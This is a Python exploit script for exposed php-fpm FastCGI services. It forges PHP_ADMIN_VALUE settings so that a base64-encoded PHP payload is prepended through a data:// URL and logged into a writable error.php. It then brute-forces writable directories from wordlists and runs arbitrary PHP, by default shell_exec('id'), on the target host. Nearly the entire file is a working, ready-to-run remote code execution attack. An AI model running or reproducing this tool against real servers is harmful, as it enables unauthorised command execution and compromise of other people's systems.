import argparse
import sys
import base64
import logging
import os
import fcgi_client

def exec(client, filePath, cmd, technique='save_handler', retry=7):
    egg = "toooooooooooooooooooooot"
    
    base64cmd = base64.b64encode(f"<?php echo '{egg}'; {cmd}; echo '{egg}'; exit(); ?>".encode('ascii')).decode('ascii')

    php_admin_value = {
        #'safe_mode': '0',
        'open_basedir': '/',
        'html_errors': '0',
        'error_reporting': '-1',
        'log_errors': '1',
        'error_log': filePath,
        'allow_url_include': '1',
        'allow_url_fopen': '1',
        'auto_prepend_file': "'data://text/plain\;base64,"+base64cmd+"'"
    }

    if technique == 'save_handler':
        php_admin_value['session.save_handler'] = 'neverexists'
        php_admin_value['session.auto_start'] = '1'
    elif technique == 'extension':
        php_admin_value['extension'] = '/neverexists'
    else:
        logging.error(f"Unknown exec technique {technique}")
        return False
    
    options = {
        'PHP_ADMIN_VALUE' : "\n".join([f"{x}={y}" for x,y in php_admin_value.items()])
    }

    for i in range(retry):
        response = client.post(filePath, '', options)
        responseSplit = response.split(egg)
        if len(responseSplit) >= 3:
            return responseSplit[1]
        else:
            logging.debug(f"Cannot find egg in respone, retrying {i}")
        
    return False


class ColorFormatter(logging.Formatter):
    grey = "\x1b[90m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31m"
    reset = "\x1b[0m"
    green = "\x1b[1;32m"
    bold_red = "\\x1b[31;1m"

    FORMATS = {
        logging.DEBUG: f"{grey}[*] %(message)s{reset}",
        logging.INFO: f"{green}[+]{reset} %(message)s",
        logging.WARNING: f"{yellow}[!] %(message)s{reset}",
        logging.ERROR: f"{red}[!] %(message)s{reset}",
        logging.CRITICAL: f"{bold_red}[!] %(message)s{reset}"
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)



if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Execute arbitrary PHP command on exposed php-fpm host')
    parser.add_argument('-t', '--target', help='Target to call, host:port or unix://path', required=True)
    parser.add_argument('-c', '--cmd', help='PHP command to execute', default="echo shell_exec('id')")
    parser.add_argument('-d', '--directory', help='Writable directory list comma separated', default=None)
    parser.add_argument('-r', '--retry', help='Retry request count', default=7, type=int)
    parser.add_argument('-e', '--exec-technique', help='Execution technique', default='save_handler', choices=['save_handler', 'extension'])
    parser.add_argument('-m', '--timeout', help='Socket timeout in ms', default=3000, type=int)
    parser.add_argument('-v', '--verbose', help='Verbose output', action="store_true", default=False)
    parser.add_argument('-n', '--no-color', help='No colored output', action="store_true", default=False)

    args, unknow = parser.parse_known_args()

    logger = logging.getLogger()
    handler = logging.StreamHandler()
    if args.no_color:
        handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
    else:
        handler.setFormatter(ColorFormatter())
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)
    
    client = fcgi_client.PHPFPMClient(args.target, args.timeout)

    # connexion test
    logging.info(f"Checking connectivity with {args.target} with an empty test request")
    response = client.request('/')
    if not response:
        sys.exit(1)
    else:
        logging.info(f"Connexion OK")
        logging.info(f"Response:")
        print(response)

    if args.directory:
        writableDirs = args.directory.split(',')
    else:
        currentDirectory = os.path.dirname(os.path.realpath(__file__))
        f = open(os.path.join(currentDirectory, 'directory-base-list.txt'), 'r')
        baseDirs = f.read().split('\n')
        f.close()

        f = open(os.path.join(currentDirectory, 'directory-relative-list.txt'), 'r')
        relativeDirs = f.read().split('\n')
        f.close()

        writableDirs = baseDirs.copy()

        for baseDir in baseDirs:
            for relDir in relativeDirs:
                if '\\' in baseDir:
                    relDir = relDir.replace('/', '\\')
                writableDirs.append(baseDir+relDir)
    
    logging.info(f"Loaded {len(writableDirs)} writable directories combinations")

    # Look for a writable dir and test PHP exec
    errorLogFilename = 'error.php'
    dummyCmd = "echo 1"
    finalWritableDir = None
    logging.info(f"Using exec technique '{args.exec_technique}'")
    logging.info(f"Searching for a writable dir with dummy cmd '{dummyCmd}'")
    for writableDir in writableDirs:
        filePath = writableDir + errorLogFilename
        logging.info(f"Trying directory {writableDir}")
        response = exec(client, filePath, dummyCmd, args.exec_technique)
        if response:
            logging.info(f"!! Got PHP command exec with a test command: {dummyCmd}")
            logging.info(f"Tips: for quicker exec next time use option: -d {writableDir}")
            finalWritableDir = writableDir
            break
    
    if not finalWritableDir:
        logging.error(f"Exploit failed: cannot find writable directory within the list")
        sys.exit(2)
    
    # Execute the final user command
    logging.info(f"Executing: {args.cmd}")
    response = exec(client, finalWritableDir + errorLogFilename, args.cmd, args.exec_technique)
    if not response:
        logging.error(f"Execution failed: check your PHP syntax")
        sys.exit(3)
    
    logging.info(f"Execution success:")
    print(response)

    sys.exit(0)

    
